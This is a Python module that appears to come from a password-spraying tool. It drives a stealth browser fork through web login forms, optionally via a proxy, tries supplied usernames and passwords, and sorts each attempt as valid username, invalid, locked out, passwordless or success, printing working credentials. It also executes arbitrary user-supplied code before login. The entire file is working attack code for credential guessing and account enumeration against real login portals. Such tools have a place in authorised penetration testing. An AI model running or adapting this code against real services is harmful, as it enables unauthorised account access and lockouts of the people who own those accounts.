from patchright.sync_api import Playwright, sync_playwright, expect, Error
from patchright._impl._errors import TimeoutError
from datetime import datetime
from time import sleep

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def list_in_string(string_to_check="", list_to_compare=None):
    # Return True if any string from ``list_to_compare`` exists in ``string_to_check``.
    if not list_to_compare:
        return False
    for comparison_string in list_to_compare:
        if comparison_string.lower() in string_to_check.lower():
            return True
    return False


def main(spray_config, proxy_url):
    """
    Playwright-based version of attempt_login. Keeps the same return shape:
    {'USERNAME': ..., 'PASSWORD': ..., 'RESULT': <"SUCCESS"|"INVALID"|"LOCKED"|"PASSWORDLESS"|"VALID USERNAME"|"INVALID USERNAME"|"ERROR">}
    """

    # Playwright setup
    launch_kwargs = {
        "headless": bool(spray_config.headless),
        "timeout": 15000,  # 15s default for browser contexts and actions
    }
    if proxy_url:
        # Playwright expects a server in scheme://host:port
        launch_kwargs["proxy"] = {"server": proxy_url}

    # Build the XPaths once
    user_xpath = f"//input[@{spray_config.username_field_key}='{spray_config.username_field_value}']"
    pw_xpath = f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']"
    checkbox_xpath = (
        f"//input[@{spray_config.checkbox_key}='{spray_config.checkbox_value}']"
        if getattr(spray_config, "checkbox_key", None) and getattr(spray_config, "checkbox_value", None)
        else None
    )

    with sync_playwright() as p:
        browser = p.chromium.launch(**launch_kwargs)
        context = browser.new_context()
        page = context.new_page()

        # Equivalent to delete_all_cookies
        context.clear_cookies()

        # Try to load URL up to 3 times
        nav_ok = False
        for i in range(3):
            try:
                page.goto(spray_config.url, wait_until="load", timeout=15000)
                nav_ok = True
                break
            except TimeoutError:
                if i == 2:
                    print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - ERROR - Could not load the URL: {spray_config.url}")
                    context.close()
                    browser.close()
                    return {
                        "USERNAME": spray_config.username,
                        "PASSWORD": spray_config.password,
                        "RESULT": "ERROR",
                    }

        # Execute Before Code
        if getattr(spray_config, "pre_login_code", None):
            # Give the hook access to page, context, browser if the user wants it
            local_vars = {"page": page, "context": context, "browser": browser}
            exec(spray_config.pre_login_code, {}, local_vars)

        # Wait for username field
        try:
            page.wait_for_selector(f"xpath={user_xpath}", state="visible", timeout=5000)
        except TimeoutError:
            print(
                f"ERROR - Could not find the username field with key {spray_config.username_field_key} and value {spray_config.username_field_value}"
            )
            context.close()
            browser.close()
            return {
                "USERNAME": spray_config.username,
                "PASSWORD": spray_config.password,
                "RESULT": "ERROR",
            }

        # Fill username
        user_loc = page.locator(f"xpath={user_xpath}")
        user_loc.clear()
        user_loc.fill(spray_config.username)

        # Try to locate password field directly
        try:
            page.wait_for_selector(f"xpath={pw_xpath}", state="visible", timeout=1000)
        except TimeoutError:
            # Hit Enter on username field to advance
            user_loc.press("Enter")
            sleep(1)

            # Microsoft special case
            try:
                page_content = page.content()
                if ("Microsoft" in page_content) and ("Work or school account" in page_content):
                    work_box = page.locator("xpath=//div[@id='aadTile']")
                    if work_box.count() > 0:
                        work_box.first.click()
                        sleep(1)
            except Exception:
                pass

        # Early classification checks before password fill
        page_source_lc = page.content().lower()
        if list_in_string(string_to_check=page_source_lc, list_to_compare=spray_config.invalid_username):
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - USERNAME INVALID: {spray_config.username}")
            context.close()
            browser.close()
            return {
                "USERNAME": spray_config.username,
                "PASSWORD": spray_config.password,
                "RESULT": "INVALID USERNAME",
            }
        elif list_in_string(string_to_check=page_source_lc, list_to_compare=spray_config.lockout):
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.WARNING}ACCOUNT LOCKOUT{Colors.END}: {spray_config.username}")
            context.close()
            browser.close()
            return {
                "USERNAME": spray_config.username,
                "PASSWORD": spray_config.password,
                "RESULT": "LOCKED",
            }
        elif list_in_string(string_to_check=page_source_lc, list_to_compare=spray_config.passwordless):
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - PASSWORDLESS: {spray_config.username}")
            context.close()
            browser.close()
            return {
                "USERNAME": spray_config.username,
                "PASSWORD": spray_config.password,
                "RESULT": "PASSWORDLESS",
            }
        elif not spray_config.password:
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.GREEN}VALID USERNAME{Colors.END}: {spray_config.username}")
            context.close()
            browser.close()
            return {
                "USERNAME": spray_config.username,
                "PASSWORD": spray_config.password,
                "RESULT": "VALID USERNAME",
            }

        # Wait for and fill password
        try:
            page.wait_for_selector(f"xpath={pw_xpath}", state="visible", timeout=3000)
        except TimeoutError:
            print(
                f"ERROR - Could not find the password field with key '{spray_config.password_field_key}' and value '{spray_config.password_field_value}'"
            )
            context.close()
            browser.close()
            return {
                "USERNAME": spray_config.username,
                "PASSWORD": spray_config.password,
                "RESULT": "ERROR",
            }

        pw_loc = page.locator(f"xpath={pw_xpath}")
        pw_loc.clear()
        pw_loc.fill(spray_config.password)

        # Optional checkbox
        if checkbox_xpath:
            try:
                cb = page.locator(f"xpath={checkbox_xpath}")
                if cb.count() > 0:
                    cb.first.click()
            except Exception:
                print(
                    f"ERROR - Could not find the password field with key {spray_config.password_field_key} and value {spray_config.password_field_value}"
                )

        # Submit
        pw_loc.press("Enter")

        # Evaluate result
        sleep(2)  # allow redirects or async checks
        page_source = page.content()
        page_source_lc = page_source.lower()

        # Lockout after submit
        if list_in_string(string_to_check=page_source_lc, list_to_compare=spray_config.lockout):
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.WARNING}ACCOUNT LOCKOUT{Colors.END}: {spray_config.username}")
            context.close()
            browser.close()
            return {
                "USERNAME": spray_config.username,
                "PASSWORD": spray_config.password,
                "RESULT": "LOCKED",
            }

        seen_flag = False
        for s in (spray_config.fail + spray_config.success):
            if s in page_source:
                seen_flag = True
                break

        if seen_flag and spray_config.success:
            result = "SUCCESS"
        elif not seen_flag and spray_config.fail:
            result = "SUCCESS"
        elif seen_flag and spray_config.fail:
            result = "INVALID"
        elif not seen_flag and spray_config.success:
            result = "INVALID"
        else:
            # Fallback if neither list is provided or nothing matched
            result = "INVALID"

        context.close()
        browser.close()

    if result == "SUCCESS":
        print(
            f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.GREEN}SUCCESS{Colors.END}: {spray_config.username} - {spray_config.password}"
        )
    else:
        print(
            f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - INVALID: {spray_config.username} - {spray_config.password}"
        )

    return {
        "USERNAME": spray_config.username,
        "PASSWORD": spray_config.password,
        "RESULT": result,
    }
